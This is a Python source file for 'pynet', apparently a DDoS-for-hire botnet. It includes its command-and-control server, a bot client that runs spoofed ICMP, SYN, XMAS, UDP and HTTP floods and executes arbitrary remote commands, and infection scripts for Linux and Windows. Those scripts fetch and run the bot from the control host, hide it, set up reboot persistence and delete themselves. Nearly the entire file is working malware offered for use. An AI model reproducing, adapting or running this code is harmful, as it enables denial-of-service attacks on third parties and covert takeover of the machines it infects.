#!/usr/bin/python3
import socket
import sys
import threading
import signal
import os
import time
import sqlite3
import hashlib
import http.server
import socketserver
import shutil
from settings import *

threads = []
users = []

user_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
user_sock.bind((SERVER_IP,COMMAND_PORT))
user_sock.listen()

def public_setup():
	if os.path.exists(PUBLIC):
		shutil.rmtree(PUBLIC)
	os.mkdir(PUBLIC)

	with open(os.path.join(PUBLIC, 'client.py'), 'w') as f:
		f.write(f'''#!/usr/bin/python3\nimport socket\nimport threading\nimport os\nimport time\nfrom scapy.all import *\nimport requests\nimport getpass\n\nSERVER_IP = '{BIND_IP}'\nBOT_PORT = {BOT_PORT}\n\nthreads = []\n\ndef random_ip():\n\treturn '.'.join([str(random.randint(0,255)) for i in range(4)])\n\nclass Attack:\n\tdef icmp(ip, attack_time):\n\t\tend = time.time() + attack_time\n\t\twhile time.time() < end:\n\t\t\ttry:\n\t\t\t\tp = IP(dst=ip, src=random_ip())/ICMP()/(b'A'*1024)\n\t\t\t\tsend(p)\n\t\t\texcept:\n\t\t\t\tcontinue\n\n\tdef syn(ip, port, attack_time):\n\t\tend = time.time() + attack_time\n\t\twhile time.time() < end:\n\t\t\ttry:\n\t\t\t\tp = IP(dst=ip, src=random_ip())/TCP(sport=RandShort(), dport=port, flags='S')/Raw(b'A'*1024)\n\t\t\t\tsend(p)\n\t\t\texcept:\n\t\t\t\tcontinue\n\n\tdef xmas(ip, port, attack_time):\n\t\tend = time.time() + attack_time\n\t\twhile time.time() < end:\n\t\t\ttry:\n\t\t\t\tp = IP(dst=ip, src=random_ip())/TCP(sport=RandShort(),dport=port,flags="NCEUAPRSF")/Raw(b'A'*1024)\n\t\t\t\tsend(p)\n\t\t\texcept:\n\t\t\t\tcontinue\n\n\tdef udp(ip, port, attack_time):\n\t\tend = time.time() + attack_time\n\t\twhile time.time() < end:\n\t\t\ttry:\n\t\t\t\tp = IP(dst=ip, src=random_ip())/UDP(sport=RandShort(),dport=port)/Raw(b'A'*1024)\n\t\t\t\tsend(p)\n\t\t\texcept:\n\t\t\t\tcontinue\n\n\tdef http(url, attack_time):\n\t\theaders = {{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36'}}\n\t\tend = time.time() + attack_time\n\t\twhile time.time() < end:\n\t\t\ttry:\n\t\t\t\trequests.get(url,headers=headers, timeout=0.1, verify=False)\n\t\t\texcept:\n\t\t\t\tcontinue\n\nclass Client:\n\tdef __init__(self):\n\t\tself.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\t\tself.s.settimeout(5)\n\t\tself.start_threading()\n\n\tdef start_threading(self):\n\t\tclient_await_cmd = threading.Thread(target=self.await_cmd)\n\t\tthreads.append(client_await_cmd)\n\t\tclient_await_cmd.start()\n\n\tdef await_cmd(self):\n\t\twhile True:\n\t\t\ttry:\n\t\t\t\tself.s.connect((SERVER_IP,BOT_PORT))\n\t\t\texcept:\n\t\t\t\t# Continue in loop if we have an existing socket\n\t\t\t\tpass\n\t\t\t\n\t\t\ttry:\n\t\t\t\tcmd = self.s.recv(1024).decode('utf-8')\n\t\t\texcept socket.timeout:\n\t\t\t\t# Jump to beginning of loop if we hit the timeout\n\t\t\t\tcmd = ''\n\t\t\t\tcontinue\n\t\t\texcept ConnectionRefusedError:\n\t\t\t\tself.s.close()\n\t\t\t\tcontinue\n\t\t\texcept Exception as e:\n\t\t\t\t# Existing connection closed, create new socket\n\t\t\t\tself.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\t\t\t\tself.s.settimeout(5)\n\t\t\t\tcontinue\n\t\t\t\n\t\t\tif cmd:\n\t\t\t\ttask = threading.Thread(target=self.handle_cmd, args=(cmd,), daemon=True)\n\t\t\t\tthreads.append(task)\n\t\t\t\ttask.start()\n\n\tdef handle_cmd(self,cmd):\n\t\tcommand = cmd.lower().strip().split()\n\t\t\n\t\tif cmd == 'ping':\n\t\t\ttry:\n\t\t\t\tself.s.send('pong'.encode('utf-8'))\n\t\t\texcept:\n\t\t\t\tpass\n\n\t\tif command[0] == 'info':\n\t\t\ttry:\n\t\t\t\tself.s.send(f'{{os.name}} {{getpass.getuser()}}'.encode('utf-8'))\n\t\t\texcept:\n\t\t\t\tpass\n\n\t\telif command[0] == 'cmd':\n\t\t\tos.system(' '.join(command[1:]))\n\t\t\n\t\telif command[0] == 'icmp':\n\t\t\ttry:\n\t\t\t\tmethod, ip, time = command\n\t\t\t\tAttack.icmp(ip, int(time))\n\t\t\texcept:\n\t\t\t\tpass\n\t\t\n\t\telif command[0] == 'syn':\n\t\t\ttry:\n\t\t\t\tmethod, ip, port, time = command\n\t\t\t\tAttack.syn(ip, int(port), int(time))\n\t\t\texcept:\n\t\t\t\tpass\n\n\t\telif command[0] == 'xmas':\n\t\t\ttry:\n\t\t\t\tmethod, ip, port, time = command\n\t\t\t\tAttack.xmas(ip, int(port), int(time))\n\t\t\texcept:\n\t\t\t\tpass\n\t\t\n\t\telif command[0] == 'udp':\n\t\t\ttry:\n\t\t\t\tmethod, ip, port, time = command\n\t\t\t\tAttack.udp(ip, int(port), int(time))\n\t\t\texcept:\n\t\t\t\tpass\n\t\t\n\t\telif command[0] == 'http':\n\t\t\ttry:\n\t\t\t\tmethod, url, time = command\n\t\t\t\tAttack.http(url, int(time))\n\t\t\texcept:\n\t\t\t\tpass\n\t\t\n\t\telse:\n\t\t\tpass\n\nClient()''')

	with open(os.path.join(PUBLIC, 'infect.sh'), 'w') as f:
		f.write(f'''#!/bin/bash\nexec &>/dev/null\nFILEPATH=$(realpath $0)\nPS=$(ps aux)\nif ! ls $HOME/.config/.client.py && ! echo $PS | grep -oE $HOME/.config/.client.py && [ $(id -u) == "0" ]\nthen\n	apt install -y build-essential libbz2-dev libffi-dev libssl-dev zlib1g zlib1g-dev wget || sudo yum install -y gcc gcc-c++ kernel-devel make bzip2-devel libffi-devel openssl-devel zlib zlib-devel wget\n	wget -q https://www.python.org/ftp/python/3.9.6/Python-3.9.6.tgz -O ~/Python-3.9.6.tgz\n	tar -xzf ~/Python-3.9.6.tgz\n	cd ~/Python-3.9.6\n	./configure --prefix=$HOME/.python\n	make -j && make -j altinstall\n	echo "export PATH=$HOME/.python/bin:$PATH" >> ~/.bashrc\n	source ~/.bashrc\n	~/.python/bin/pip3.9 install -qqq --user scapy requests\n	mkdir -p ~/.config\n	wget -q http://{BIND_IP}:{WEB_PORT}/client.py -O ~/.config/.client.py\n	setcap cap_net_raw+ep $HOME/.python/bin/python3.9\n	crontab -l | {{ cat; echo -e "SHELL=/bin/bash\\n@reboot $HOME/.python/bin/python3.9 $HOME/.config/.client.py &"; }} | crontab -\n	~/.python/bin/python3.9 ~/.config/.client.py &\n	rm -f ~/Python-3.9.6.tgz\n	rm -rf ~/Python-3.9.6\nfi\nrm -f $FILEPATH''')

	with open(os.path.join(PUBLIC, 'infect.ps1'), 'w') as f:
		f.write(f'''$PayloadURL = "http://{BIND_IP}:{WEB_PORT}/client.py"\n$PayloadPath = "$Env:LOCALAPPDATA\\client.pyw"\n$version = $(python -V)\n$Installed = $version.Substring(0,8) -eq "Python 3"\n$Python = "$Env:LOCALAPPDATA\\Programs\\Python\\Python39\\python.exe"\nif (-Not $Installed) {{\nInvoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.5/python-3.9.5-amd64.exe" -OutFile $Env:TMP\\python-3.9.5-amd64.exe\n.$Env:TMP\\python-3.9.5-amd64.exe /quiet PrependPath=1 InstallLauncherAllUsers=0 | Out-Null\n$version = .$Python -V\n$Installed = $version.Substring(0,8) -eq "Python 3"\n}}\nif ($Installed -And -not (Test-Path $PayloadPath)) {{\nInvoke-WebRequest -Uri $PayloadURL -OutFile $PayloadPath\nattrib +h "$PayloadPath"\n$TargetFile = "$PayloadPath"\n$ShortcutFile = "$Env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.lnk"\n$WScriptShell = New-Object -ComObject WScript.Shell\n$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)\n$Shortcut.TargetPath = $TargetFile\n$Shortcut.Save()\n.$Python -m pip install scapy requests | Out-Null\n.$PayloadPath\n}}''')

	with open(os.path.join(PUBLIC, 'infect.bat'), 'w') as f:
		f.write(f'''@echo off\npowershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://{BIND_IP}:{WEB_PORT}/infect.ps1')"\ndel %0\nexit''')

	os.chdir(PUBLIC)
	Handler = http.server.SimpleHTTPRequestHandler
	httpd = socketserver.TCPServer(('', WEB_PORT), Handler)
	print(f'Linux Payload: http://{BIND_IP}:{WEB_PORT}/infect.bat')
	print(f'Windows Payload: http://{BIND_IP}:{WEB_PORT}/infect.sh')
	httpd.serve_forever()

def get_db_con():
	db = sqlite3.connect(DB_URI, uri=True, isolation_level=None)
	cur = db.cursor()
	return db, cur

def handle_users():
	while True:
		try:
			client, ip = user_sock.accept()
			if client:
				foo = threading.Thread(target=User, args=(client,))
				threads.append(foo)
				foo.start()
		except:
			pass

def check_online():
	while True:
		for user in users:
			try:
				user.send(b'\x00') # Send null bytes every second, exception will be thrown if client is offline
			except:
				user.close()
				users.remove(user)
			time.sleep(1)

def log_event(text,type):
	if type == 'success':
		return f'{Colors.GREEN}[+]{Colors.END} ' + text + '\r\n'
	
	elif type == 'info':
		return f'{Colors.LIGHT_BLUE}[+]{Colors.END} ' + text + '\r\n'
	
	elif type == 'error':
		return f'{Colors.RED}[!]{Colors.END} ' + text + '\r\n'
	
	else:
		return '\r\n'

class Colors:
	BLACK = '\033[0;30m'
	RED = '\033[0;31m'
	GREEN = '\033[0;32m'
	BROWN = '\033[0;33m'
	BLUE = '\033[0;34m'
	PURPLE = '\033[0;35m'
	CYAN = '\033[0;36m'
	LIGHT_GRAY = '\033[0;37m'
	DARK_GRAY = '\033[1;30m'
	LIGHT_RED = '\033[1;31m'
	LIGHT_GREEN = '\033[1;32m'
	YELLOW = '\033[1;33m'
	LIGHT_BLUE = '\033[1;34m'
	LIGHT_PURPLE = '\033[1;35m'
	LIGHT_CYAN = '\033[1;36m'
	LIGHT_WHITE = '\033[1;37m'
	BOLD = '\033[1m'
	FAINT = '\033[2m'
	ITALIC = '\033[3m'
	UNDERLINE = '\033[4m'
	BLINK = '\033[5m'
	NEGATIVE = '\033[7m'
	CROSSED = '\033[9m'
	END = '\033[0m'

class User:
	def __init__(self, client):
		self.client = client
		self.authenticated = False
		self.user = {
			'username': '',
			'max_time': 0,
			'expiration': '',
		}
		self.receive_login()

	def receive_login(self):
		login = ''
		username_prompted = False
		passwd_prompted = False
		while True:
			try:
				if not username_prompted:
					self.client.send(f'Username:'.encode('utf-8'))
					username_prompted = True
				try:
					buf = self.client.recv(1).decode('utf-8')
				except:
					pass
				if not passwd_prompted:
					self.client.send(f'Password:'.encode('utf-8'))
					passwd_prompted = True
				if buf != '\n':
					login += buf.strip()
				elif buf == '\n':
					login += ':'
				if len(login.split(':')) == 3:
					username, passwd, _ = login.split(':')
					login = ''
					username_prompted = False
					passwd_prompted = False
					break
			except:
				pass
		self.authenticate(username,passwd)

	def authenticate(self, user, passwd):
		db, cur = get_db_con()
		query = cur.execute("SELECT username, max_time, expiration FROM users WHERE username=? AND password=?", (user, hashlib.sha256(passwd.encode('utf-8')).hexdigest()))
		result = query.fetchone()
		if result:
			username, max_time, expiration = result
			self.authenticated = True
			self.user['username'] = username
			self.user['max_time'] = max_time
			self.user['expiration'] = expiration
			users.append(self.client)
			self.receive_cmd()
		else:
			try:
				self.client.send(f'{Colors.RED}Login failed.{Colors.END}\r\n'.encode('utf-8'))
				time.sleep(1)
				self.client.close()
			except:
				pass

	def receive_cmd(self):
		if self.authenticated:
			self.client.send(f'{Colors.GREEN}██████╗ ██╗   ██╗{Colors.END}{Colors.BLUE}███╗   ██╗███████╗████████╗{Colors.END}\r\n{Colors.GREEN}██╔══██╗╚██╗ ██╔╝{Colors.END}{Colors.BLUE}████╗  ██║██╔════╝╚══██╔══╝{Colors.END}\r\n{Colors.GREEN}██████╔╝ ╚████╔╝ {Colors.END}{Colors.BLUE}██╔██╗ ██║█████╗     ██║   {Colors.END}\r\n{Colors.GREEN}██╔═══╝   ╚██╔╝  {Colors.END}{Colors.BLUE}██║╚██╗██║██╔══╝     ██║   {Colors.END}\r\n{Colors.GREEN}██║        ██║   {Colors.END}{Colors.BLUE}██║ ╚████║███████╗   ██║   {Colors.END}\r\n{Colors.GREEN}╚═╝        ╚═╝   {Colors.END}{Colors.BLUE}╚═╝  ╚═══╝╚══════╝   ╚═╝   {Colors.END}\r\nRun \033[0;32mhelp\033[0m for help menu.\r\n'.encode('utf-8'))
			while True:
				self.client.send(f'[{Colors.RED}{self.user["username"]}{Colors.END}@{Colors.GREEN}pynet{Colors.END}]# '.encode('utf-8'))
				cmd = ''
				while True:
					try:
						buf = self.client.recv(1).decode('utf-8')
					except:
						pass
					if buf != '\n':
						cmd += buf
					elif buf == '\n':
						break
				command = cmd.strip().split()
				out = cnc.handle_cmd(cmd, self.user).encode('utf-8')
				try:
					self.client.send(out)
				except:
					pass

class Server:
	attack_commands = ['cmd', 'icmp', 'syn', 'xmas', 'udp', 'http']
	clients = []
	def __init__(self):
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.bind((SERVER_IP,BOT_PORT))
		self.s.listen()
		self.start_threading()

	def start_threading(self):
		cnc_conn = threading.Thread(target=self.handle_connections)
		threads.append(cnc_conn)
		cnc_conn.start()
		
		cnc_update = threading.Thread(target=self.update)
		threads.append(cnc_update)
		cnc_update.start()

		public_serve = threading.Thread(target=public_setup)
		threads.append(public_serve)
		public_serve.start()

	def update(self):
		while True:
			online = []
			for client in Server.clients:	
				try:
					client.send('ping'.encode('utf-8'))
					resp = client.recv(1024).decode('utf-8')
				except Exception as e:
					resp = str(e)
				if resp == 'pong':
					online.append(client)
			Server.clients = online
			time.sleep(1)

	@staticmethod
	def validate_cmd(ip=None,url=None,port=None):
		try:
			if port:
				assert 0 < int(port) < 65536
			if ip:
				socket.gethostbyname(ip)
			if url:
				assert url.startswith('http://') or url.startswith('https://')
			return True
		except:
			return False

	@staticmethod
	def check_local(ip):
		ipv4 = socket.gethostbyname(ip).split('.')
		if ipv4[0] == '127' or ipv4[0] == '10' or (ipv4[0] == '192' and ipv4[1] == '168') or (ipv4[0] == '172' and 16 <= ipv4[1] <= 31):
			return True
		return False

	@staticmethod
	def check_time(time,max_time):
		try:
			assert 0 < int(time) <= max_time
			return True
		except AssertionError:
			return False

	def handle_cmd(self,cmd,user):
		command = cmd.strip().split()
		cmd = cmd.strip()
		sent = 'Sent \033[0;32m{}\033[0m to all clients.'
		sent_attack = 'Started \033[0;32m{}\033[0m attack.'
		broke = 'Specified attack time exceeds max_time.'
		local = '{} is a local IP.'

		if len(cmd) == 0:
			return log_event('No command specified. Run \033[0;32mhelp\033[0m for help menu.','error')
		
		if command[0] == 'help':
			out = ''
			commands = [
'help			Shows this help menu.',
'account			Shows account information for the current user.',
'users			Shows the number of online users.',
'bots			Shows the number of online bots',
'list			Lists the bot IPs.',
'info			List OS and current user for each bot.',
'cmd <COMMAND>		Run a system command on all bots.',
'icmp <IP> <TIME>		Floods the target with ICMP packets.',
'syn <IP> <PORT> <TIME>	Floods the target with SYN packets.',
'xmas <IP> <PORT> <TIME>	Sends packets with all TCP flags enabled.',
'udp <IP> <PORT> <TIME>	Floods the target with UDP packets.',
'http <URL> <TIME>		Floods a target URL with GET requests.',
]
			for c in commands:
				out += log_event(c,'info')
			return out
		
		elif command[0] == 'account':
			out = ''
			for key, value in user.items():
				out += log_event(f'{key.title().replace("_"," ")}: {value}', 'info')
			return out

		elif command[0] == 'users':
			return log_event(f'Users: {len(users)}', 'success')

		elif command[0] == 'bots':
			return log_event(f'Bots: {len(Server.clients)}', 'success')

		elif command[0] == 'list':
			out = ''
			for client in Server.clients:
				out += log_event(client.getpeername()[0], 'info')
			return out

		elif command[0] == 'info':
			out = ''
			for client in Server.clients:
				client.send('info'.encode('utf-8'))
				try:
					client.settimeout(5)
					resp = client.recv(1024).decode('utf-8')
					os, name = resp.split(' ')
				except:
					os, name = None, None
				out += log_event(f'{client.getpeername()[0]} - {os} - {name}', 'info')
			return out

		elif command[0] == 'cmd':
			self.send_cmd(cmd)
			return log_event(sent.format(' '.join(command[1:])), 'success')

		elif command[0] == 'icmp':
			try:
				method, ip, time = command
				assert Server.validate_cmd(ip=ip)
				if Server.check_local(ip):
					return log_event(local.format(ip), 'error')
				if Server.check_time(time,user['max_time']):
					self.send_cmd(cmd)
					return log_event(sent_attack.format(command[0]), 'success')
				else:
					return log_event(broke, 'error')
			except:
				return log_event('Usage: icmp <IP> <TIME>', 'error')
		
		elif command[0] == 'syn':
			try:
				method, ip, port, time = command
				assert Server.validate_cmd(ip=ip,port=port)
				if Server.check_local(ip):
					return log_event(local.format(ip), 'error')
				if Server.check_time(time,user['max_time']):
					self.send_cmd(cmd)
					return log_event(sent_attack.format(command[0]), 'success')
				else:
					return log_event(broke, 'error')
			except:
				return log_event('Usage: syn <IP> <PORT> <TIME>', 'error')
		
		elif command[0] == 'xmas':
			try:
				method, ip, port, time = command
				assert Server.validate_cmd(ip=ip,port=port)
				if Server.check_local(ip):
					return log_event(local.format(ip), 'error')
				if Server.check_time(time,user['max_time']):
					self.send_cmd(cmd)
					return log_event(sent_attack.format(command[0]), 'success')
				else:
					return log_event(broke, 'error')
			except:
				return log_event('Usage: xmas <IP> <PORT> <TIME>', 'error')
		
		elif command[0] == 'udp':
			try:
				method, ip, port, time = command
				assert Server.validate_cmd(ip=ip,port=port)
				if Server.check_local(ip):
					return log_event(local.format(ip), 'error')
				if Server.check_time(time,user['max_time']):
					self.send_cmd(cmd)
					return log_event(sent_attack.format(command[0]), 'success')
				else:
					return log_event(broke, 'error')
			except:
				return log_event('Usage: udp <IP> <PORT> <TIME>', 'error')
		
		elif command[0] == 'http':
			try:
				method, url, time = command
				assert Server.validate_cmd(url=url)
				if Server.check_time(time,user['max_time']):
					self.send_cmd(cmd)
					return log_event(sent_attack.format(command[0]), 'success')
				else:
					return log_event(broke, 'error')
			except:
				return log_event('Usage: http <URL> <TIME>', 'error')	
		
		else:
			return log_event('Invalid command. Run \033[0;32mhelp\033[0m for help menu.','error')

	def send_cmd(self,cmd):
		for client in Server.clients:
			client.send(cmd.encode('utf-8'))
	
	def handle_connections(self):
		while True:
			try:
				client, ip = self.s.accept()
				if client:
					Server.clients.append(client)
			except socket.timeout:
				continue

cnc = Server()

t = threading.Thread(target=handle_users)
threads.append(t)
t.start()

t1 = threading.Thread(target=check_online)
threads.append(t1)
t1.start()
